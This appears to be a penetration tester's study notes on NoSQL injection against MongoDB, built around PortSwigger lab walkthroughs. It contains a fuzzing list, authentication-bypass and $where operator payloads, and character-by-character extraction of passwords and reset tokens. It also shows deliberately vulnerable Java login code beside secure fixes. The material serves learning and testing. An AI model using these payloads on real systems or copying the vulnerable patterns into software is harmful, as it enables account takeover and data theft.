tactic: Initial Access

**NoSQL Injection** is when an attacker interferes with queries made to a NoSQL database (MongoDB, CouchDB, Redis, etc.) by injecting syntax or operators into user-controlled input. Unlike SQLi, NoSQL injection often abuses the database's own query operators rather than SQL grammar.


**Syntax Injection** — breaks the query structure by injecting characters that alter how the query is parsed, similar to classic SQLi:

```
' " ` { } ; $Foo \xYZ
```

**Operator Injection** — injects NoSQL query operators (like `$ne`, `$gt`, `$where`) that manipulate query logic without breaking syntax:

```json
{"username": {"$ne": "invalid"}}
```

---

## Impact

- Authentication bypass
- Data extraction (enumeration of unknown fields and values)
- Privilege escalation
- Denial of service via `sleep()`
- Server-side code execution via `$where` JavaScript expressions

---

## Injection Points

- Login form fields (username, password)
- Search and filter parameters
- URL query strings (`?category=fizzy`)
- JSON request body parameters
- Password reset token fields
- Any parameter passed to a MongoDB query

---

## Entry Point Fuzzing List

```
'
''
;%00
--
-- -
""
;
' OR '1
' OR 1 -- -
" OR "" = "
" OR 1 = 1 -- -
' OR '' = '
OR 1=1
$gt
{"$gt":""}
{"$gt":-1}
$ne
{"$ne":""}
{"$ne":-1}
$nin
{"$nin":1}
{"$nin":[1]}
|| '1'=='1
//
||'a'\\'a
'||'1'=='1';//
'/{}:
'"\;{}
'"\/$[].>
{"$where": "sleep(1000)"}
{"$ne":"invalid"}
```

---

## Checklist

### Detection — Syntax Injection

- [ ]  Inject `'` alone — does the response change or error?
- [ ]  Then inject `\'` — if no error, the app is likely vulnerable (not escaping input):

```
	?category=fizzy'     ← error or different response
	?category=fizzy\'    ← no error = unescaped input confirmed
```

- [ ]  Fuzz with the full entry point list above
- [ ]  Try injecting into JSON body — change `Content-Type` to `application/json` if needed

### Detection — Boolean Conditions

- [ ]  Inject false and true conditions and compare responses:

```
	' && 0 && 'x     ← should return nothing/empty
	' && 1 && 'x     ← should return normal results
```

- [ ]  Override existing condition with always-true:

```
	'fizzy'||'1'=='1'    ← returns all categories
```

- [ ]  Append null byte to ignore trailing query conditions:

```
	?category=fizzy%00
```

### Operator Injection — Authentication Bypass

- [ ]  Replace string values with operator objects in the JSON body:

```json
	{"username": {"$ne": "invalid"}, "password": {"$ne": "invalid"}}
```

```
Both conditions are always true → logged in as first user
```

- [ ]  Target specific users:
```json
	{"username": {"$in": ["admin", "administrator", "superadmin"]}, "password": {"$ne": ""}}
```

- [ ]  Regex match to find valid usernames:

```json
	{"username": {"$regex": "admin.*"}, "password": {"$ne": ""}}
```

### Operator Injection — $where JavaScript Execution

- [ ]  Inject a `$where` clause that evaluates to true/false:

```json
	{"username": "wiener", "password": "peter", "$where": "1"}
	{"username": "wiener", "password": "peter", "$where": "0"}
```

```
Different responses = `$where` is being evaluated
```

### Data Extraction — Extract Field Values Char by Char

- [ ]  Extract a known field (e.g. password) one character at a time using boolean response:

```
	GET /user/lookup?user=admin'+%26%26+this.password[0]+%3d%3d+'a'+||+'a'%3d%3d'b
```

```
Decoded: `admin' && this.password[0] == 'a' || 'a'=='b`
```

- [ ]  Automate with Burp Intruder — Cluster Bomb attack:
    - Position 1 = character index (`§0§`)
    - Position 2 = character value (`§a§`)

```
	/user/lookup?user=admin'+%26%26+this.password[§0§]+%3d%3d+'§a§'+||+'a'%3d%3d'b
```

### Data Extraction — Enumerate Unknown Field Names

- [ ]  Use `Object.keys()` in a `$where` expression to enumerate fields by index:

```json
	{"$where": "function(){if(Object.keys(this)[4].match(/^.{§0§}§a§.*/)) return 1; return 0;}"}
```

```
- Position 1 = field name length
- Position 2 = character at that position
- Iterate index (`[4]`) to find all fields on the document
```

- [ ]  Once you find a field like `newPwdTkn`, extract its value the same way:

```json
	{
	    "username": "carlos",
	    "password": {"$ne": "Invalid"},
	    "$where": "function(){if(this.newPwdTkn.match(/^.{§0§}§a§.*/)) return 1; return 0;}"
	}
```

- [ ]  Use the extracted token in the password reset endpoint:

```
	GET /forgot-password?newPwdTkn=EXTRACTED_TOKEN
```

### Timing-Based Blind Detection

- [ ]  Trigger a time delay to confirm injection when no boolean difference is visible:

```json
	{"$where": "sleep(5000)"}
```

- [ ]  Extract data via timing — delay if condition is true:

```javascript
	admin'+function(x){var waitTill = new Date(new Date().getTime() + 5000);
	while((x.password[0]==="a") && waitTill > new Date()){};}(this)+'

	admin'+function(x){if(x.password[0]==="a"){sleep(5000)};}(this)+'
```

### GET to POST Conversion

- [ ]  If injection point is a GET parameter but operators need JSON, convert the request:
    1. Change `GET` to `POST`
    2. Set `Content-Type: application/json`
    3. Move query params to JSON body
    4. Inject operators into the JSON

## Attack Payloads

**Auth bypass — both fields always true:**

```json
{"username": {"$ne": "invalid"}, "password": {"$ne": "invalid"}}
```

**Auth bypass — target specific user list:**

```json
{"username": {"$in": ["admin", "administrator", "superadmin"]}, "password": {"$ne": ""}}
```

**Always-true URL injection:**

```
?category=Clothing%2c+shoes+and+accessories'||'1'=='1
```

**Regex password extraction (char by char):**

```
admin' && this.password[0] == 'a' || 'a'=='b
```

**Enumerate unknown fields via $where:**

```json
{"$where": "function(){if(Object.keys(this)[4].match(/^.{0}n.*/)) return 1; return 0;}"}
```

**Extract hidden field value:**

```json
{
    "username": "carlos",
    "password": {"$ne": "Invalid"},
    "$where": "function(){if(this.newPwdTkn.match(/^a.*/)) return 1; return 0;}"
}
```

**Timing blind:**

```json
{"$where": "sleep(5000)"}
```

## White Box Testing

**Vulnerable, user input concatenated directly into MongoDB query:**

```java
@PostMapping("/login")
public ResponseEntity<?> login(@RequestBody Map<String, String> body) {
    String username = body.get("username");
    String password = body.get("password");

    // string interpolation into the query — attacker injects $ne operator
    // by sending: {"username":{"$ne":"x"},"password":{"$ne":"x"}}
    // MongoDB receives these as operators, not string values
    Document query = Document.parse(
        "{username: '" + username + "', password: '" + password + "'}"
    );
    Document result = collection.find(query).first();
    if (result != null) return ResponseEntity.ok("Logged in as " + result.get("username"));
    return ResponseEntity.status(401).build();
}
```

**Vulnerable, $where clause built from user input — JS execution:**

```java
@GetMapping("/user/lookup")
public ResponseEntity<?> lookup(@RequestParam String user) {
    // attacker injects: admin' && this.password[0] == 'a' || 'a'=='b
    String whereClause = "this.username == '" + user + "'";
    Document query = new Document("$where", whereClause);
    Document result = collection.find(query).first();
    return ResponseEntity.ok(result);
}
```

**Vulnerable, operator injection via JSON body deserialized directly into query:**
```java
@PostMapping("/api/users/search")
public ResponseEntity<?> search(@RequestBody Document searchQuery) {
    // the entire Document is passed directly to MongoDB
    // attacker sends: {"username": {"$ne": "invalid"}} → bypasses all checks
    List<Document> results = collection.find(searchQuery).into(new ArrayList<>());
    return ResponseEntity.ok(results);
}
```

**Secure:**

```java
// Always bind values explicitly — never parse user input as a Document or query
@PostMapping("/login")
public ResponseEntity<?> login(@RequestBody LoginRequest req) {
    // use eq() filter — values are always treated as literal strings
    // operator objects like {"$ne": "x"} are treated as the string {"$ne": "x"} not an operator
    Document query = new Document("username", req.getUsername())
                         .append("password", req.getPassword());
    // or use typed filters:
    Bson filter = Filters.and(
        Filters.eq("username", req.getUsername()),
        Filters.eq("password", req.getPassword())
    );
    Document result = collection.find(filter).first();
    if (result != null) return ResponseEntity.ok("Logged in");
    return ResponseEntity.status(401).build();
}

// Disable $where in MongoDB server config — prevents JS execution entirely
// In mongod.conf:
// security:
//   javascriptEnabled: false

// Validate and sanitize input types before using in queries
private void validateStringInput(String input) {
    if (input == null || input.contains("$") || input.contains("{")) {
        throw new IllegalArgumentException("Invalid input");
    }
}

// Use Spring Data MongoDB repository — generates safe queries automatically
public interface UserRepository extends MongoRepository<User, String> {
    Optional<User> findByUsernameAndPassword(String username, String password);
    // Spring Data generates: db.users.find({username: "x", password: "y"})
    // operator injection is not possible through method-name queries
}
```

# Lab: Detecting NoSQL injection

`GET /filter?category=Clothing%2c+shoes+and+accessories'||'1' == '1




# Lab: Exploiting NoSQL operator injection to bypass authentication

```nosql
{"username":
{"$in":["adminnvmx3tsy"]},"password":{"$ne":""}}
```



# Lab: Exploiting NoSQL injection to extract data


```nosql
`admin' && this.password[0] == 'a' || 'a'=='b`
```


```http
GET /user/lookup?user=administrator'+%26%26+this.password[§0§]+%3d%3d+'§a§'+||+'a'%3d%3d'b
```


intruder cluster bomb 


# Lab: Exploiting NoSQL operator injection to extract unknown fields



start with  `login` there is `username` and `password`

check the entry point list we notice there is a difference in the response

add where 0 and 1 we can see that when it is responding with 1  meaning true 0 false for carlos credential

use this to check the keys
```
"$where":"function(){if(Object.keys(this)[4].match(/^.{§0§}§a§.*/)) return 1; return 0;}"
```

we notice that there is a  field of newPwdTkn 
go to get forget Password and add this field ?newPwdTkn=0412818a5712f41e 
```
{"username":"carlos","password":{
"$ne": "Invalid"
},
"$where":"function(){if(this.newPwdTkn.match(/^.{§a§}§a§.*/)) return 1; return 0;}"

}
```


## Resources

- [PortSwigger NoSQL Injection](https://portswigger.net/web-security/nosql-injection)
- [HackTricks NoSQL Injection](https://book.hacktricks.xyz/pentesting-web/nosql-injection)
- [PayloadsAllTheThings NoSQL](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection)